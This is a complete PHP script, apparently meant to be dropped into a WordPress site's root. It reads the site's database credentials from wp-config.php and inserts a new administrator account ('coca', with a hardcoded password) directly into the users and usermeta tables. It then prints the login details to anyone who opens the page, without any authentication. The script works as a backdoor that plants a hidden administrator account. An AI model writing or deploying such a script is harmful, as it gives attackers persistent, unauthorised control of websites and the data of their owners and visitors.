<?php
// create_admin.php
require_once __DIR__ . '/wp-config.php';

$mysqli = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
if ($mysqli->connect_error) {
    die("Koneksi gagal: " . $mysqli->connect_error);
}

// Data user admin baru
$username = 'coca';
$password = '@coca@';
$email = 'coca@gmail.com';

// Hash password WordPress
require_once __DIR__ . '/wp-includes/class-phpass.php';
$wp_hasher = new PasswordHash(8, true);
$hashed_password = $wp_hasher->HashPassword($password);

// Waktu saat ini
$current_time = current_time('mysql');

// Insert user baru ke tabel users
$sql_user = "INSERT INTO {$table_prefix}users 
            (user_login, user_pass, user_email, user_registered, user_status, display_name) 
            VALUES (
                '".$mysqli->real_escape_string($username)."',
                '".$mysqli->real_escape_string($hashed_password)."',
                '".$mysqli->real_escape_string($email)."',
                '".$current_time."',
                0,
                '".$mysqli->real_escape_string($username)."'
            )";

if ($mysqli->query($sql_user) === TRUE) {
    $user_id = $mysqli->insert_id;
    echo "User '$username' berhasil dibuat dengan ID: $user_id<br>";
    
    // Dapatkan capability administrator
    $admin_capabilities = 'a:1:{s:13:"administrator";b:1;}';
    
    // Insert ke tabel usermeta untuk role administrator
    $sql_meta = "INSERT INTO {$table_prefix}usermeta 
                (user_id, meta_key, meta_value) 
                VALUES 
                ($user_id, '{$table_prefix}capabilities', '".$mysqli->real_escape_string($admin_capabilities)."'),
                ($user_id, '{$table_prefix}user_level', '10')";
    
    if ($mysqli->query($sql_meta) === TRUE) {
        echo "Role administrator berhasil diberikan kepada user '$username'<br>";
        echo "Login: $username<br>";
        echo "Password: $password<br>";
        echo "Email: $email<br>";
    } else {
        echo "Error memberikan role admin: " . $mysqli->error;
    }
    
} else {
    echo "Error membuat user: " . $mysqli->error;
}

$mysqli->close();
?>